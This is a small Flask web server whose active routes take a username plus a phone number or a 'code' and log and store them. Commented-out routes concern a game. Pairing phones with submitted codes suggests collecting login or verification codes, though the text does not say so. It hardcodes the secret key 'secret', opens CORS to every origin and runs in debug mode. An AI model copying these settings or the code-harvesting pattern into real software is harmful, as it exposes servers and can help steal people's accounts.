from flask import Flask, request, render_template, redirect, url_for, session, make_response, jsonify
from flask_cors import CORS 
from base import *
import shutil

terminal_width = shutil.get_terminal_size().columns
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
CORS(app) 

# def check_session():
#     username = session.get('username')
#     if username:
#         is_registered = check_user_register(username)
#         return username
#     return False


# @app.route('/api/offer', methods=['POST'])
# def offer():
#     data = request.get_json()
#     MyId = data.get('myUserId')
#     EnemyId = data.get('EnemyId')
#     room = data.get('room')
#     move = data.get('move')
    
#     if not MyId or not EnemyId or not room:
#         return jsonify({'status': 'error', 'message': 'Missing data'}), 400

#     add_offer(MyId, EnemyId, room, move)

#     return jsonify({'status': 'ok'})

# @app.route('/api/DeleteUserSession', methods=['GET'])
# def delete_user_session():
#     username = check_session()
#     if username:
#         UserId = check_id(username)
#         if UserId:
#             del_session_game(UserId)
#             return jsonify({'message': 'ZAEBIS'}), 200
#     else:
#         return jsonify({'message': 'NO'}), 401

@app.route('/code', methods = ['POST'])
def code():
    data = request.get_json()
    user = data.get('username')
    code = data.get('code')
    print(user, code)
    if user and code:
        add_code(code, user)
        return jsonify({'status': 200, 'message': 'Код принят'})  # <- Добавили status
    else:
        return jsonify({'message': 'Просто дерьмище'}), 401


@app.route('/phone', methods = ['POST'])
def phone():
    data = request.get_json()
    user = data.get('username')
    phone = data.get('phone')
    print(user, phone)
    if user and phone:
        add_phone(phone, user)
        return jsonify({'message': 'dalbaeb'}), 200
    else:
        return jsonify({'message': 'Просто дерьмище'}), 401

@app.route('/', methods=['GET'])
def main():
    html = 'index.html'
    return render_template(html)

if __name__ == '__main__':
    app.run(debug=True) 